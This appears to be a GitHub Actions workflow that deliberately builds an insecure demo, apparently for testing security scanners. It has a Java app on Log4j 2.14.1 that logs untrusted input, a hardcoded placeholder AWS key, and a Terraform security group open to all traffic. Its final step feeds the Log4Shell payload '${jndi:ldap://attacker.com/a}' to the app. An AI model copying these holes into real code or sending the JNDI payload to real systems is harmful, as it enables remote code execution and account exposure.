name: Vulnerable Log4j Pipeline

on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  build-log4j:
    runs-on: ubuntu-latest

    steps:
      - name: Checkout repository
        uses: actions/checkout@v3

      - name: Set up Java
        uses: actions/setup-java@v3
        with:
          java-version: '11'
          distribution: 'temurin'

      - name: Create vulnerable Log4j app
        run: |
          mkdir -p log4j-demo/src/main/java/com/example
          cd log4j-demo

          # Create pom.xml with vulnerable Log4j
          cat <<EOF > pom.xml
          <project xmlns="http://maven.apache.org/POM/4.0.0"
                   xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
                   xsi:schemaLocation="http://maven.apache.org/POM/4.0.0
                   http://maven.apache.org/xsd/maven-4.0.0.xsd">
            <modelVersion>4.0.0</modelVersion>
            <groupId>com.example</groupId>
            <artifactId>vulnerable-log4j</artifactId>
            <version>1.0</version>
            <dependencies>
              <dependency>
                <groupId>org.apache.logging.log4j</groupId>
                <artifactId>log4j-core</artifactId>
                <version>2.14.1</version>
              </dependency>
            </dependencies>
            <build>
              <plugins>
                <plugin>
                  <groupId>org.codehaus.mojo</groupId>
                  <artifactId>exec-maven-plugin</artifactId>
                  <version>3.1.0</version>
                  <configuration>
                    <mainClass>com.example.Log4jVuln</mainClass>
                  </configuration>
                </plugin>
              </plugins>
            </build>
          </project>
          EOF

          # Create vulnerable Java file
          cat <<EOF > src/main/java/com/example/Log4jVuln.java
          package com.example;

          import org.apache.logging.log4j.LogManager;
          import org.apache.logging.log4j.Logger;

          public class Log4jVuln {
              static Logger logger = LogManager.getLogger(Log4jVuln.class);

              public static void main(String[] args) {
                  String input = System.getenv("UNSAFE_INPUT");
                  logger.error("Log: " + input); // vulnerable sink
              }
          }
          EOF

      - name: Simulate IaC misconfig and hardcoded secrets
        run: |
          echo 'access_key = "AKIAEXAMPLEKEY123"' > secrets.tf
          echo 'resource "aws_security_group" "open_all" {
              name = "open-sg"
              description = "Allows all inbound traffic"
              ingress {
                  from_port   = 0
                  to_port     = 0
                  protocol    = "-1"
                  cidr_blocks = ["0.0.0.0/0"]
              }
              egress {
                  from_port   = 0
                  to_port     = 0
                  protocol    = "-1"
                  cidr_blocks = ["0.0.0.0/0"]
              }
          }' > insecure.tf

      - name: Build with Maven
        run: |
          cd log4j-demo
          export UNSAFE_INPUT='${jndi:ldap://attacker.com/a}'
          mvn compile exec:java -Dexec.mainClass=com.example.Log4jVuln || true
          
